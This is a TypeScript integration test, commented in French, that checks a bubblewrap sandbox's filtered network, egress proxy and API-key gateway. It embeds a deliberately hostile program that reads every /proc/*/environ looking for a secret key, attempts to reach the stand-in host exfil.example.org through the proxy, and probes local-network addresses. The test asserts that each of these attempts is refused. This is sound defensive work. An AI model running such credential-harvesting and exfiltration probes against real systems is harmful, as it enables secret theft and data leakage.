// LE RÉSEAU FILTRÉ, EN VRAI — un vrai bubblewrap, le vrai relais, le vrai
// proxy du nœud, et un programme DANS le bac qui essaie ce qu'un agent
// hostile essaierait :
//
//   · lire la vraie clé dans l'environnement de n'importe quel processus du bac ;
//   · joindre un hôte hors liste par le proxy ;
//   · joindre le réseau local, en direct puis par le proxy ;
//   · appeler l'API de son modèle par la passerelle — ce qui doit MARCHER, et
//     arriver à l'amont avec la vraie clé.
//
// Conditionnel, et dit comme tel : sans bubblewrap capable d'ouvrir un bac
// filtré ici, la sonde du nœud le dit et le banc ne prétend rien — SAUF sur la
// jambe Linux de la CI, qui installe bubblewrap et pose `HIVE_BWRAP_REQUIS=1`
// (motif de `isolement-runtime.integration.test.ts`) : là, un réseau non
// filtrable fait ÉCHOUER le banc au lieu de le sauter. Le chemin conteneur est
// éprouvé sur ses arguments (`enveloppe-reseau.test.ts`).

import { spawn } from 'node:child_process';
import { mkdtempSync, rmSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import {
  contexteHote,
  envDuLanceur,
  envelopper,
  fournisseurParNom,
  sonderReseauFiltre,
  type Fournisseur,
} from '../src/node-client/isolement.js';
import { ouvrirReseauTache } from '../src/node-client/reseau-tache.js';
import type { RefusReseau } from '../src/node-client/proxy-egress.js';
import { RendezVousPont } from '../src/node-client/rendez-vous-pont.js';

const BWRAP = fournisseurParNom('bubblewrap') as Fournisseur;
const sonde =
  process.platform === 'linux'
    ? await sonderReseauFiltre(BWRAP)
    : { filtre: false, motif: 'bubblewrap : Linux seulement' };

/** Ce que le programme du bac rapporte, en une ligne JSON. */
interface Rapport {
  cleVisible: boolean;
  environsLus: number;
  passerelle: { statut: number; corps: string } | { erreur: string };
  horsListe: string;
  lanDirect: string;
  lanProxy: string;
}

/** Le programme hostile, exécuté DANS le bac. */
const PROGRAMME = String.raw`
const fs = require('node:fs'), http = require('node:http'), net = require('node:net');
const marque = process.argv[1];
let lus = 0, visible = false;
for (const p of fs.readdirSync('/proc')) {
  if (!/^\d+$/.test(p)) continue;
  try { const e = fs.readFileSync('/proc/' + p + '/environ', 'utf8'); lus++; if (e.includes(marque)) visible = true; } catch {}
}
const connecter = (cible) => new Promise((r) => {
  const s = net.connect(3128, '127.0.0.1'); let t = '';
  s.on('data', (c) => (t += c)); s.on('end', () => r(t.split('\r\n')[0] + ' | ' + t.split('\r\n\r\n')[1]));
  s.on('error', (e) => r('erreur ' + e.code)); s.write('CONNECT ' + cible + ' HTTP/1.1\r\nHost: ' + cible + '\r\n\r\n');
});
const direct = () => new Promise((r) => {
  const s = net.connect(80, '192.168.1.1'); s.on('connect', () => { s.destroy(); r('OUVERT'); });
  s.on('error', (e) => r(e.code));
});
const passerelle = () => new Promise((r) => {
  const u = new URL(process.env.ANTHROPIC_BASE_URL + '/v1/messages');
  const q = http.request(u, { method: 'POST', headers: { 'x-api-key': process.env.ANTHROPIC_API_KEY } }, (res) => {
    let c = ''; res.on('data', (d) => (c += d)); res.on('end', () => r({ statut: res.statusCode, corps: c }));
  });
  q.on('error', (e) => r({ erreur: e.code || e.message })); q.end('{}');
});
(async () => {
  const rapport = {
    cleVisible: visible, environsLus: lus,
    passerelle: await passerelle(),
    horsListe: await connecter('exfil.example.org:443'),
    lanDirect: await direct(),
    lanProxy: await connecter('10.1.2.3:443'),
  };
  process.stdout.write(JSON.stringify(rapport) + '\n');
})();
`;

it.runIf(process.env.HIVE_BWRAP_REQUIS === '1')(
  'HIVE_BWRAP_REQUIS=1 exige un bubblewrap qui FILTRE le réseau',
  () => {
    expect(sonde, sonde.motif).toMatchObject({ filtre: true });
  },
);

describe.skipIf(!sonde.filtre)(`réseau filtré en vrai sous bubblewrap (${sonde.motif})`, () => {
  // La partie aléatoire seule entre dans le bac (en argument du programme) :
  // assez pour la reconnaître dans un environnement, pas la clé elle-même.
  const marque = `REELLE${Math.random().toString(36).slice(2)}`;
  const reelle = `sk-ant-api03-${marque}`;
  let amont: Server;
  let recu: { url: string; cle: string | undefined } | null = null;
  let tache: string;
  let rapport: Rapport;
  const refus: RefusReseau[] = [];

  beforeAll(async () => {
    amont = createServer((req, res) => {
      recu = { url: req.url ?? '', cle: req.headers['x-api-key'] as string | undefined };
      req.resume();
      res.end('{"type":"message"}');
    });
    await new Promise<void>((r) => amont.listen(0, '127.0.0.1', () => r()));
    const port = (amont.address() as { port: number }).port;
    tache = mkdtempSync(path.join(os.tmpdir(), 'hive-tache-reseau-'));
    const rendezVous = new RendezVousPont();
    const reseau = await ouvrirReseauTache({
      niveau: 'integrations',
      capacite: { filtre: true, exige: false, motif: sonde.motif },
      agent: 'claude-code',
      repoUrl: null,
      cwd: tache,
      env: { PATH: process.env.PATH, ANTHROPIC_API_KEY: reelle },
      // L'amont de la passerelle : une base posée par le membre, que le NŒUD joint.
      envHote: { ANTHROPIC_BASE_URL: `http://127.0.0.1:${port}/membre` },
      reservation: rendezVous,
      surRefus: (r) => refus.push(r),
    });
    if (reseau.etat !== 'filtre') throw new Error(`réseau ${reseau.etat}`);
    try {
      const lance = envelopper(process.execPath, ['-e', PROGRAMME, marque], {
        fournisseur: BWRAP,
        cwdHote: tache,
        variables: [],
        hote: contexteHote(),
        reseau: reseau.reseau,
      });
      const sortie = await new Promise<string>((resolve, reject) => {
        const enfant = spawn(lance.bin, lance.args, {
          env: envDuLanceur(BWRAP, reseau.env),
          stdio: ['ignore', 'pipe', 'pipe'],
        });
        let out = '';
        let err = '';
        enfant.stdout.on('data', (c: Buffer) => (out += c.toString()));
        enfant.stderr.on('data', (c: Buffer) => (err += c.toString()));
        enfant.on('error', reject);
        enfant.on('close', (code) =>
          code === 0 ? resolve(out) : reject(new Error(`${code} ${err}`)),
        );
      });
      rapport = JSON.parse(sortie.trim().split('\n').at(-1) ?? '{}') as Rapport;
    } finally {
      await reseau.fermer();
      rendezVous.fermer();
    }
  }, 60_000);

  afterAll(async () => {
    await new Promise<void>((r) => amont.close(() => r()));
    rmSync(tache, { recursive: true, force: true });
  });

  it('LA VRAIE CLÉ N’EST DANS AUCUN /proc/*/environ DU BAC', () => {
    expect(rapport.environsLus).toBeGreaterThan(0);
    expect(rapport.cleVisible).toBe(false);
  });

  it('l’API du modèle RÉPOND par la passerelle, et l’amont reçoit la vraie clé', () => {
    expect(rapport.passerelle).toEqual({ statut: 200, corps: '{"type":"message"}' });
    expect(recu).toEqual({ url: '/membre/v1/messages', cle: reelle });
  });

  it('un hôte hors liste est refusé, avec un motif lisible, et journalisé', () => {
    expect(rapport.horsListe).toMatch(/^HTTP\/1\.1 403 .*exfil\.example\.org.*« integrations »/);
    expect(refus.map((r) => r.hote)).toContain('exfil.example.org');
  });

  it('le réseau local est injoignable : en direct (pas d’interface), et par le proxy', () => {
    expect(rapport.lanDirect).toMatch(/ENETUNREACH|EHOSTUNREACH|ENETDOWN/);
    expect(rapport.lanProxy).toMatch(/^HTTP\/1\.1 403/);
  });
});

// Train 7 — le réseau COUPÉ des passes hors ligne de la porte de sécurité
// (`reseauCoupe`) : en vrai, le bac n'a que sa boucle, et rien n'y écoute — ni
// relais, ni proxy. Le même programme sans le drapeau voit le réseau de l'hôte
// (`--share-net`) : c'est ce qui prouve que le banc saurait voir une fuite. Ce
// contrôle ne lit QUE les interfaces : sur un hôte sans route vers
// 192.168.1.1 (un runner de CI), une connexion y attendrait le délai de TCP.
describe.skipIf(!sonde.filtre)(`réseau coupé en vrai sous bubblewrap (${sonde.motif})`, () => {
  const SONDE_COUPEE = String.raw`
const os = require('node:os'), net = require('node:net');
const essayer = (port, hote) => new Promise((r) => {
  const s = net.connect(port, hote);
  const t = setTimeout(() => { s.destroy(); r('DELAI'); }, 3000);
  s.on('connect', () => { clearTimeout(t); s.destroy(); r('OUVERT'); });
  s.on('error', (e) => { clearTimeout(t); r(e.code); });
});
(async () => {
  const rapport = { interfaces: Object.keys(os.networkInterfaces()).sort() };
  if (process.argv[1] === 'sonder') {
    rapport.relais = await essayer(3128, '127.0.0.1');
    rapport.lan = await essayer(80, '192.168.1.1');
  }
  process.stdout.write(JSON.stringify(rapport) + '\n');
})();
`;
  const lancer = async (
    coupe: boolean,
  ): Promise<{ interfaces: string[]; relais?: string; lan?: string }> => {
    const tache = mkdtempSync(path.join(os.tmpdir(), 'hive-tache-coupee-'));
    try {
      const sonder = coupe ? ['sonder'] : [];
      const lance = envelopper(process.execPath, ['-e', SONDE_COUPEE, ...sonder], {
        fournisseur: BWRAP,
        cwdHote: tache,
        variables: [],
        hote: contexteHote(),
        ...(coupe ? { reseauCoupe: true } : {}),
      });
      const sortie = await new Promise<string>((resolve, reject) => {
        const enfant = spawn(lance.bin, lance.args, {
          env: { PATH: process.env.PATH },
          stdio: ['ignore', 'pipe', 'pipe'],
        });
        let out = '';
        let err = '';
        enfant.stdout.on('data', (c: Buffer) => (out += c.toString()));
        enfant.stderr.on('data', (c: Buffer) => (err += c.toString()));
        enfant.on('error', reject);
        enfant.on('close', (code) =>
          code === 0 ? resolve(out) : reject(new Error(`${code} ${err}`)),
        );
      });
      return JSON.parse(sortie.trim().split('\n').at(-1) ?? '{}') as {
        interfaces: string[];
        relais?: string;
        lan?: string;
      };
    } finally {
      rmSync(tache, { recursive: true, force: true });
    }
  };

  it('la boucle seule, rien n’y écoute, le réseau local injoignable — et sans le drapeau, l’hôte', async () => {
    const coupe = await lancer(true);
    expect(coupe.interfaces).toEqual(['lo']);
    expect(coupe.relais).toBe('ECONNREFUSED');
    expect(coupe.lan).toMatch(/ENETUNREACH|EHOSTUNREACH|ENETDOWN/);
    const hote = await lancer(false);
    expect(
      hote.interfaces.length,
      'sans le drapeau, le bac voit le réseau de l’hôte',
    ).toBeGreaterThan(1);
  }, 60_000);
});
